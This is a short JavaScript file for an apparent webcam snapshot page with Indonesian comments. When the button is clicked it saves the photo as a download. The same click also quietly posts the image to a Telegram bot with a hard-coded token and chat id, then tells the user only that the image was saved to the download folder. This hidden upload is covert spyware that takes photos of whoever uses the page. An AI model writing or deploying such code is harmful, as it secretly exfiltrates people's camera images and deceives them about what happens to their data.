let video = document.getElementById('video');
let canvas = document.getElementById('canvas');
let take = document.getElementById('cta');

if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({
        video: true
    }).then(function(sream) {
        video.srcObject = sream;
        video.play();
    });
}

let Context = canvas.getContext('2d');
take.addEventListener('click', function() {
    Context.drawImage(video, 0, 0, 640, 480);
    take.classList.toggle('active');

        // Fungsi untuk simpan ke galeri (download)
    function saveToGallery() {
    const link = document.createElement('a');
    link.download = 'WEBCAM_by_ruliana.png'; // nama file
    link.href = canvas.toDataURL('image/png'); // ambil data dari canvas
    link.click(); // otomatis klik link download
    }
    saveToGallery();

    canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("chat_id", -4984874266);
        formData.append("photo", blob, "snapshot.png");
        fetch(`https://api.telegram.org/bot8229591264:AAEH2f0iZeJ11lCXW48xwi8NaYhkns0u6qA/sendPhoto`, {
          method: "POST",
          body: formData
        })
        .then(res => res.json())
        .then(data => {
          console.log("Gambar tersimpan ke folder download", data);
          alert("Gambar tersimpan ke folder download");
        })
        .catch(err => {
          console.error("Gagal menyimpan gambar", err);
        });
      }, "image/png");
}) 